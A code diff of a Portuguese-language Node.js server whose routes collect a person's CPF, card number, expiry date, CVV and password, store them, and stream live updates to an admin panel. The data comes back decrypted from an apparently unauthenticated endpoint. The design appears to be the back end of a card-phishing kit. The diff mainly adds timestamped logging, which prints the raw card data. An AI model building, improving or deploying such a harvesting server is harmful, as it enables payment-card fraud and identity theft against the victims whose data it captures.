@@ -238,6 +238,7 @@ const IV_LENGTH = 16;
 
 // Funções de criptografia
 function encrypt(text) {
+    if (!text) return null; // Retorna null se o texto for nulo ou vazio
     const iv = crypto.randomBytes(IV_LENGTH);
     const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
     let encrypted = cipher.update(text, 'utf8', 'hex');
@@ -247,14 +248,15 @@ function encrypt(text) {
 
 function decrypt(encryptedText) {
     try {
+        if (!encryptedText) return null; // Trata valores nulos ou vazios
         const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
         const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
         let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
         decrypted += decipher.final('utf8');
         return decrypted;
     } catch (decryptionError) {
-        console.error('Erro na descriptografia:', decryptionError.message, 'Dados:', encryptedText);
-        return null; // Retorna null em caso de falha para evitar crash
+        console.error('Erro na descriptografia:', decryptionError.message, 'Dados:', encryptedText, 'em:', new Date().toLocaleString('pt-BR'));
+        return null; // Retorna null em caso de falha
     }
 }
 
@@ -270,15 +272,15 @@ const wss = new WebSocket.Server({ server });
 
 function broadcast(message) {
     try {
-        console.log('Enviando broadcast:', message);
+        console.log('Enviando broadcast:', message, 'em:', new Date().toLocaleString('pt-BR'));
         wss.clients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
                 client.send(JSON.stringify(message));
             }
         });
-        console.log('Broadcast concluído com sucesso');
+        console.log('Broadcast concluído com sucesso em:', new Date().toLocaleString('pt-BR'));
     } catch (broadcastError) {
-        console.error('Erro no broadcast:', broadcastError.message);
+        console.error('Erro no broadcast:', broadcastError.message, 'em:', new Date().toLocaleString('pt-BR'));
     }
 }
 
@@ -302,60 +304,60 @@ app.get('/admin', (req, res) => {
 // Rotas de dados
 app.post('/api/temp-submit', validateToken, async (req, res) => {
     try {
-        console.log('Recebendo dados temporários:', req.body);
+        console.log('Recebendo dados temporários:', req.body, 'em:', new Date().toLocaleString('pt-BR'));
         const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
         if (!sessionId) return res.status(400).json({ error: 'sessionId é obrigatório.' });
 
-        console.log('Descriptografando dados recebidos:', { cpf, cardNumber, expiryDate, cvv, password });
+        // Descriptografia com tratamento de valores nulos ou vazios
         const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
-        if (!decryptedCpf && cpf) {
-            console.error('Falha na descriptografia de cpf:', cpf);
+        if (cpf && !decryptedCpf) {
+            console.error('Falha na descriptografia de cpf:', cpf, 'em:', new Date().toLocaleString('pt-BR'));
             return res.status(400).json({ error: 'Falha na descriptografia de cpf.' });
         }
         const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
-        if (!decryptedCardNumber && cardNumber) {
-            console.error('Falha na descriptografia de cardNumber:', cardNumber);
+        if (cardNumber && !decryptedCardNumber) {
+            console.error('Falha na descriptografia de cardNumber:', cardNumber, 'em:', new Date().toLocaleString('pt-BR'));
             return res.status(400).json({ error: 'Falha na descriptografia de cardNumber.' });
         }
         const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
-        if (!decryptedExpiryDate && expiryDate) {
-            console.error('Falha na descriptografia de expiryDate:', expiryDate);
+        if (expiryDate && !decryptedExpiryDate) {
+            console.error('Falha na descriptografia de expiryDate:', expiryDate, 'em:', new Date().toLocaleString('pt-BR'));
             return res.status(400).json({ error: 'Falha na descriptografia de expiryDate.' });
         }
         const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
-        if (!decryptedCvv && cvv) {
-            console.error('Falha na descriptografia de cvv:', cvv);
+        if (cvv && !decryptedCvv) {
+            console.error('Falha na descriptografia de cvv:', cvv, 'em:', new Date().toLocaleString('pt-BR'));
             return res.status(400).json({ error: 'Falha na descriptografia de cvv.' });
         }
         const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
-        if (!decryptedPassword && password) {
-            console.error('Falha na descriptografia de password:', password);
+        if (password && !decryptedPassword) {
+            console.error('Falha na descriptografia de password:', password, 'em:', new Date().toLocaleString('pt-BR'));
             return res.status(400).json({ error: 'Falha na descriptografia de password.' });
         }
 
-        console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword });
+        console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword }, 'em:', new Date().toLocaleString('pt-BR'));
         const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
         const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
         const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
 
-        console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword });
+        console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword }, 'em:', new Date().toLocaleString('pt-BR'));
         const result = await pool.query(
             `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
              VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
              ON CONFLICT (session_id) DO UPDATE SET
-                 cpf = COALESCE(EXCLUDED.cpf, temp_data.cpf),
-                 card_number = COALESCE(EXCLUDED.card_number, temp_data.card_number),
-                 expiry_date = COALESCE(EXCLUDED.expiry_date, temp_data.expiry_date),
-                 cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
-                 password = COALESCE(EXCLUDED.password, temp_data.password),
+                 cpf = COALESCE($2, temp_data.cpf),
+                 card_number = COALESCE($3, temp_data.card_number),
+                 expiry_date = COALESCE($4, temp_data.expiry_date),
+                 cvv = COALESCE($5, temp_data.cvv),
+                 password = COALESCE($6, temp_data.password),
                  updated_at = CURRENT_TIMESTAMP`,
             [sessionId, decryptedCpf || null, encryptedCardNumber || null, decryptedExpiryDate || null, encryptedCvv || null, encryptedPassword || null]
         );
-        console.log('Query executada com sucesso:', result.rowCount);
+        console.log('Query executada com sucesso:', result.rowCount, 'em:', new Date().toLocaleString('pt-BR'));
         broadcast({ type: 'TEMP_DATA_UPDATE' }); // Broadcast após cada atualização
         res.json({ message: 'Dados temporários salvos com sucesso!' });
     } catch (error) {
-        console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack);
+        console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack, 'em:', new Date().toLocaleString('pt-BR'));
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
@@ -363,12 +365,12 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
 // Rotas de dados com depuração adicional para /api/temp-data
 app.get('/api/temp-data', async (req, res) => {
     try {
-        console.log('Recebendo requisição para /api/temp-data');
+        console.log('Recebendo requisição para /api/temp-data em:', new Date().toLocaleString('pt-BR'));
         const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
-        console.log('Dados brutos do temp_data:', result.rows);
+        console.log('Dados brutos do temp_data:', result.rows, 'em:', new Date().toLocaleString('pt-BR'));
         const decryptedRows = result.rows.map(row => {
             try {
-                console.log('Descriptografando linha:', row);
+                console.log('Descriptografando linha:', row, 'em:', new Date().toLocaleString('pt-BR'));
                 return {
                     ...row,
                     card_number: row.card_number ? decrypt(row.card_number) : null,
@@ -376,7 +378,7 @@ app.get('/api/temp-data', async (req, res) => {
                     password: row.password ? decrypt(row.password) : null
                 };
             } catch (decryptionError) {
-                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row);
+                console.error('Erro na descriptografia de linha:', decryptionError.message, 'Linha:', row, 'em:', new Date().toLocaleString('pt-BR'));
                 return {
                     ...row,
                     card_number: null,
@@ -385,10 +387,10 @@ app.get('/api/temp-data', async (req, res) => {
                 };
             }
         });
-        console.log('Dados descriptografados antes da resposta:', decryptedRows);
+        console.log('Dados descriptografados antes da resposta:', decryptedRows, 'em:', new Date().toLocaleString('pt-BR'));
         res.json(decryptedRows);
     } catch (error) {
-        console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack);
+        console.error('Erro em /api/temp-data:', error.message, 'Stack:', error.stack, 'em:', new Date().toLocaleString('pt-BR'));
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
@@ -431,7 +433,7 @@ app.post('/submit', validateToken, async (req, res) => {
         broadcast({ type: 'TEMP_DATA_UPDATE' }); // Broadcast após submissão
         res.json({ message: 'Dados enviados com sucesso!' });
     } catch (error) {
-        console.error('Erro em /submit:', error.message, 'Stack:', error.stack);
+        console.error('Erro em /submit:', error.message, 'Stack:', error.stack, 'em:', new Date().toLocaleString('pt-BR'));
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
@@ -521,7 +523,7 @@ app.delete('/api/reset-visits', async (req, res) => {
 
 // Middleware de erro
 app.use((err, req, res, next) => {
-    console.error('Erro não tratado:', err.message);
+    console.error('Erro não tratado:', err.message, 'em:', new Date().toLocaleString('pt-BR'));
     res.status(500).json({ error: 'Erro interno do servidor.' });
 });
 
@@ -532,12 +534,12 @@ async function startServer() {
         await initializeDatabase();
         ENCRYPTION_KEY = await getEncryptionKey();
         const server = http.createServer(app);
-        server.listen(port, () => console.log(`Server rodando na porta ${port}`));
+        server.listen(port, () => console.log(`Server rodando na porta ${port} em:`, new Date().toLocaleString('pt-BR')));
         const wss = new WebSocket.Server({ server });
         wss.on('connection', (ws) => {
-            console.log('Novo cliente WebSocket conectado');
-            ws.on('close', () => console.log('Cliente WebSocket desconectado'));
-            ws.on('error', (error) => console.error('Erro WebSocket:', error.message));
+            console.log('Novo cliente WebSocket conectado em:', new Date().toLocaleString('pt-BR'));
+            ws.on('close', () => console.log('Cliente WebSocket desconectado em:', new Date().toLocaleString('pt-BR')));
+            ws.on('error', (error) => console.error('Erro WebSocket:', error.message, 'em:', new Date().toLocaleString('pt-BR')));
             ws.on('message', (message) => {
                 const data = JSON.parse(message);
                 if (data.type === 'INITIAL_UPDATE') {
@@ -549,7 +551,7 @@ async function startServer() {
             broadcast({ type: 'TEMP_DATA_UPDATE' });
         });
     } catch (error) {
-        console.error('Falha ao iniciar servidor:', error.message);
+        console.error('Falha ao iniciar servidor:', error.message, 'em:', new Date().toLocaleString('pt-BR'));
         process.exit(1);
     }
 }
